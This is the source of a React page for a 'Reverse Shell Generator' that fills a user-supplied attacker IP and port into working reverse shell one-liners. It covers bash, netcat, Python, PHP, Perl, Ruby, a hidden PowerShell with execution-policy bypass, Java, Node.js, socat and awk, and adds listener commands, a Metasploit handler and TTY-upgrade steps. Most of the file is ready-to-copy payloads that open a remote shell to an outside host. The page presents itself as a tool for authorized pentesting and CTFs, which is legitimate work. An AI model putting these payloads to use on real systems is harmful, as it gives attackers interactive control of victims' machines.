'use client';

import { useState } from 'react';
import { Copy, Terminal, AlertTriangle } from 'lucide-react';

export default function ReverseShellPage() {
  const [ip, setIp] = useState('10.10.10.10');
  const [port, setPort] = useState('4444');
  const [shellType, setShellType] = useState('bash');

  const shells: Record<string, string> = {
    bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    netcat: `nc -e /bin/sh ${ip} ${port}`,
    'netcat-openbsd': `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
    python3: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
    php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    java: `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()`,
    nodejs: `(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(${port}, "${ip}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();`,
    socat: `socat TCP:${ip}:${port} EXEC:'/bin/bash'`,
    awk: `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
  };

  const listenerCommands: Record<string, string> = {
    netcat: `nc -lvnp ${port}`,
    socat: `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`,
    metasploit: `use exploit/multi/handler
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST ${ip}
set LPORT ${port}
exploit`,
    python: `python -c 'import socket,sys;s=socket.socket();s.bind(("0.0.0.0",${port}));s.listen(1);c,a=s.accept();print(f"[+] Connection from {a}");
while 1:d=c.recv(1024);sys.stdout.write(d.decode());sys.stdout.flush()'`
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900 py-12">
      <div className="max-w-6xl mx-auto px-4">
        {/* Header */}
        <div className="text-center mb-12 animate-fade-in">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-red-600 to-orange-600 rounded-2xl mb-4">
            <Terminal className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-5xl md:text-6xl font-bold text-gray-900 dark:text-white mb-4">
            Reverse Shell Generator
          </h1>
          <p className="text-xl text-gray-600 dark:text-gray-400 max-w-2xl mx-auto">
            Generate reverse shell commands for penetration testing and security research
          </p>
        </div>

        {/* Warning */}
        <div className="card p-6 mb-8 bg-red-50 dark:bg-red-900/20 border-red-200 dark:border-red-800">
          <div className="flex items-start gap-3">
            <AlertTriangle className="w-6 h-6 text-red-600 dark:text-red-400 flex-shrink-0 mt-1" />
            <div>
              <h3 className="font-bold text-red-900 dark:text-red-300 mb-1">⚠️ Educational Purpose Only</h3>
              <p className="text-sm text-red-800 dark:text-red-400">
                These commands are for authorized penetration testing, CTF competitions, and security research only.
                Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
              </p>
            </div>
          </div>
        </div>

        {/* Configuration */}
        <div className="card p-8 mb-8">
          <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">Configuration</h2>
          <div className="grid md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2">
                Your IP Address
              </label>
              <input
                type="text"
                value={ip}
                onChange={(e) => setIp(e.target.value)}
                placeholder="10.10.10.10"
                className="input"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2">
                Port
              </label>
              <input
                type="text"
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="4444"
                className="input"
              />
            </div>
          </div>
        </div>

        {/* Shell Commands */}
        <div className="card p-8 mb-8">
          <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">Reverse Shell Commands</h2>
          <div className="grid gap-4">
            {Object.entries(shells).map(([name, command]) => (
              <div key={name} className="card p-4 bg-gray-50 dark:bg-gray-800/50">
                <div className="flex items-center justify-between mb-2">
                  <h3 className="font-bold text-gray-900 dark:text-white capitalize">{name.replace('-', ' ')}</h3>
                  <button
                    onClick={() => copyToClipboard(command)}
                    className="btn btn-ghost text-sm"
                  >
                    <Copy className="w-4 h-4" />
                    Copy
                  </button>
                </div>
                <code className="block p-3 bg-gray-900 dark:bg-black rounded text-green-400 text-xs font-mono overflow-x-auto whitespace-pre-wrap break-all">
                  {command}
                </code>
              </div>
            ))}
          </div>
        </div>

        {/* Listener Commands */}
        <div className="card p-8">
          <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">Listener Commands</h2>
          <p className="text-gray-600 dark:text-gray-400 mb-6">
            Set up a listener on your attacking machine before executing the reverse shell:
          </p>
          <div className="grid gap-4">
            {Object.entries(listenerCommands).map(([name, command]) => (
              <div key={name} className="card p-4 bg-gray-50 dark:bg-gray-800/50">
                <div className="flex items-center justify-between mb-2">
                  <h3 className="font-bold text-gray-900 dark:text-white capitalize">{name}</h3>
                  <button
                    onClick={() => copyToClipboard(command)}
                    className="btn btn-ghost text-sm"
                  >
                    <Copy className="w-4 h-4" />
                    Copy
                  </button>
                </div>
                <code className="block p-3 bg-gray-900 dark:bg-black rounded text-blue-400 text-xs font-mono overflow-x-auto whitespace-pre-wrap">
                  {command}
                </code>
              </div>
            ))}
          </div>
        </div>

        {/* Upgrade Shell */}
        <div className="card p-8 mt-8">
          <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">Upgrade to Interactive Shell</h2>
          <p className="text-gray-600 dark:text-gray-400 mb-6">
            After getting a basic shell, upgrade it to a fully interactive TTY:
          </p>
          <div className="space-y-4">
            <div>
              <h3 className="font-bold text-gray-900 dark:text-white mb-2">Python Method</h3>
              <code className="block p-3 bg-gray-900 dark:bg-black rounded text-green-400 text-sm font-mono">
                python -c 'import pty; pty.spawn("/bin/bash")'<br />
                Ctrl+Z<br />
                stty raw -echo; fg<br />
                export TERM=xterm
              </code>
            </div>
            <div>
              <h3 className="font-bold text-gray-900 dark:text-white mb-2">Script Method</h3>
              <code className="block p-3 bg-gray-900 dark:bg-black rounded text-green-400 text-sm font-mono">
                /usr/bin/script -qc /bin/bash /dev/null
              </code>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
